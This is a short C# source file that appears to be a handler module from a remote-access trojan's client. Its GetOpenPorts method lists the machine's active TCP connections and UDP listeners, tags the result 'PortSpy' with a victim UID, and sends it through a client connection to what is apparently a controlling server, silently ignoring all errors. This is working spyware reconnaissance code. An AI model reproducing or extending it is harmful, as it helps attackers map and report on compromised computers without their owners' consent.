using Client.Connection;
using Client.Things;
using Stuff;
using System.Net.NetworkInformation;
using System.Text;

namespace Client.Handlers
{
    class HandlePort
    {
        public static void GetOpenPorts()
        {
            StringBuilder str = new StringBuilder();
            try
            {
                foreach (var tcp in IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpConnections())
                {
                    str.Append($"{tcp.LocalEndPoint.Port}-=>TCP-=>{tcp.State}-=>");
                }

                foreach (var udp in IPGlobalProperties.GetIPGlobalProperties().GetActiveUdpListeners())
                {
                    str.Append($"{udp.Port}-=>UDP-=>Listening-=>");
                }


                Pack pack = new Pack();
                pack.Set("Packet", "PortSpy");
                pack.Set("UID", UID.Get());
                pack.Set("Ports", str.ToString());
                SillyClient.Send(pack.Pacc());
            }
            catch { }
        }
    }
}
